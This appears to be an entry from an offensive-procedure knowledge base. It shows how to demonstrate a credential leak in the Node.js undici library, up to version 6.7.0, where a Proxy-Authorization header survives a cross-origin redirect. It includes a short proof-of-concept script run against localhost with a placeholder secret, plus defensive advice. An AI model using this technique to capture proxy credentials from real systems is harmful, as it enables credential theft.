---
id: proc-uuid-3
tags:
  - undici
  - header-injection
  - proxy-leak
type: procedure
tools:
  - '[[tools/undici]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:26.617Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute-Undici-Request-with-Sensitive-Proxy-Headers

## Summary

This procedure uses the undici library to send an HTTP GET request with a Proxy-Authorization header to a redirect endpoint, exploiting the library's failure to clear the header on cross-origin redirects for information disclosure.

## Description

Targeting undici versions up to 6.7.0, the request is configured with origin 'http://127.0.0.1/', maxRedirections: 1, and includes 'Proxy-Authorization': 'secret Proxy-Authorization'. Upon hitting the redirect server, the header persists to the target origin, leaking credentials. Requires Node.js and undici installed via npm.

## Requirements

1. Node.js 14+ with undici (^6.0.0) installed
2. Local redirect server running (from prior procedure)
3. DNS configured for cross-origin simulation

## Defense

Defensive measures and detection strategies:

- Update undici to versions >6.7.0 where fixed
- Scrub sensitive headers in custom HTTP clients
- Log and monitor proxy header usage in requests

## Objectives

1. Trigger the redirect with persistent sensitive headers
2. Demonstrate header leakage vulnerability
3. Collect evidence of disclosure for reporting

## Instructions

### Step 1: Install Undici

**Context**: Ensure the library is available in the Node.js project.

**Command** (npm install):
```bash
npm install undici
```

> Installs undici. Expected output: Package added to node_modules.

### Step 2: Create Exploit Script

**Context**: Write a JavaScript file to perform the vulnerable request.

**Command** (create file):
```bash
cat > exploit.js << 'EOF'
const { request } = require('undici');

request({
  origin: 'http://127.0.0.1/',
  pathname: '/',
  method: 'GET',
  headers: {
    'Proxy-Authorization': 'secret Proxy-Authorization'
  },
  maxRedirections: 1
}).catch(console.error);
EOF
```

> Creates the script. Expected output: File created.

### Step 3: Run the Request

**Context**: Execute the script to send the request and follow the redirect.

**Command** (node execute):
```bash
node exploit.js
```

> Sends the request. Expected output: No errors; request completes silently.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/undici]]

## Tags

- undici
- header-injection
- proxy-leak
